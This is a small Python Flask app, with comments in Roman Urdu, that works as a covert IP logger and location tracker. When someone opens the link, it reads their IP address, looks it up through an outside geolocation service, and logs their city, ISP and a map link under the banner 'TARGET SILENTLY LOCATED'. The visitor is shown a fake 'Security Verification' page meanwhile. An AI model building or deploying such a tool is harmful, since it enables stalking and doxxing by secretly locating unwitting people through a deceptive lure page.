from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/')
def home():
    # Asli IP nikalna
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    
    # Silent Location logic
    try:
        response = requests.get(f'https://ipapi.co/{ip}/json/')
        data = response.json()
        city = data.get('city', 'Unknown')
        isp = data.get('org', 'Unknown')
        lat = data.get('latitude', '0')
        lon = data.get('longitude', '0')
    except Exception as e:
        city = isp = lat = lon = f"Error: {str(e)}"

    # Logs print karna
    print(f"\n--- [!!!] TARGET SILENTLY LOCATED [!!!] ---")
    print(f"IP: {ip} | City: {city} | ISP: {isp}")
    print(f"Map: https://www.google.com/maps?q={lat},{lon}\n")

    return "<h2>Security Verification...</h2><p>Checking connection stability, please wait.</p>"

# Vercel ko batane ke liye ke ye app hai
if __name__ == "__main__":
    app.run()
